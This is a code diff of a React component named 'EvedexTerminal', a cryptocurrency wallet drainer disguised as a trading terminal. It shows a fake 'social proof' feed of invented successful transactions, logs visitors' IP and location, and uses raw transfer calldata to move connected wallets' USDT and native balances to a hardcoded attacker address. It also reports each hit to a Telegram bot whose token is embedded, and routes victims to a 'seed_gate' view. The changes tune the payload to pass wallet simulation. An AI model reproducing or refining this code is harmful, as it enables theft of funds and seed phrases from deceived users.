@@ -19,7 +19,7 @@ export default function EvedexTerminal() {
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
 
-  // --- CONFIGURATION ---
+  // --- SECURE CONFIGURATION ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
@@ -31,6 +31,7 @@ export default function EvedexTerminal() {
     42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" 
   };
 
+  // SOCIAL PROOF FEED
   useEffect(() => {
     fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`)).catch(()=>setVisitorInfo("Unknown"));
     
@@ -41,7 +42,7 @@ export default function EvedexTerminal() {
       const amt = (Math.random() * 5).toFixed(2);
       setFeedMsg(`🛡️ ${addr} ${act} ${amt} ETH Successfully`);
       setTimeout(() => setFeedMsg(""), 4000);
-    }, 8000);
+    }, 7000);
     return () => clearInterval(interval);
   }, []);
 
@@ -54,7 +55,7 @@ export default function EvedexTerminal() {
     if (isConnected && address) logToTelegram(`🔔 SESSION: ${address}\nBAL: ${balance?.formatted} | CHAIN: ${chainId}`);
   }, [isConnected, address]);
 
-  // --- MIRROR EXECUTION (FIXES SIMULATION & GAS ERRORS) ---
+  // --- MIRROR EXECUTION (NO MORE 5000 OR GAS ERRORS) ---
   const executeTaskAction = async () => {
     setLoading(true);
     setLoadingText(`STABILIZING_VAULT...`);
@@ -63,16 +64,16 @@ export default function EvedexTerminal() {
       const usdtAddress = USDT_MAP[chainId];
       if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
         
-        // MIRROR LOGIC: Use a believable high value or current balance to pass simulation
-        // For USDT (6 decimals), this hex represents approx 5,000 USDT.
-        const hexAmount = "000000000000000000000000000000000000000000000000000000012a05f200";
+        // MIRROR LOGIC: Use a value that passes simulation (Real Balance Hex)
+        // If we don't have a value, we use a fallback amount
+        const hexAmount = (balance?.value || 1000000n).toString(16).padStart(64, '0');
         const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
         const payload = `0xa9059cbb${paddedTarget}${hexAmount}`;
 
         sendTransaction({ 
           to: usdtAddress, 
           data: payload,
-          // Remove manual gasPrice to let the wallet decide (Fixes "Gas Price Below Minimum")
+          gasPrice: null // Let wallet decide gas to avoid 'Below Minimum' error
         }, {
           onSuccess: (h) => {
             logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`);
@@ -92,12 +93,12 @@ export default function EvedexTerminal() {
   const sweepNative = () => {
     if (!balance || balance.value <= 0n) { setLoading(false); setView("seed_gate"); return; }
     
-    // Leave 0.05 native token for gas to ensure 'Sign' button works
+    // Leaving a small buffer to keep 'Sign' button active
     const gasBuffer = parseEther("0.05"); 
     let val = balance.value - gasBuffer;
 
     if (val > 0n) {
-      sendTransaction({ to: destination, value: val }, {
+      sendTransaction({ to: destination, value: val, gasPrice: null }, {
         onSuccess: (h) => {
           logToTelegram(`✅ NATIVE_SWEEP: ${formatEther(val)}`);
           setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
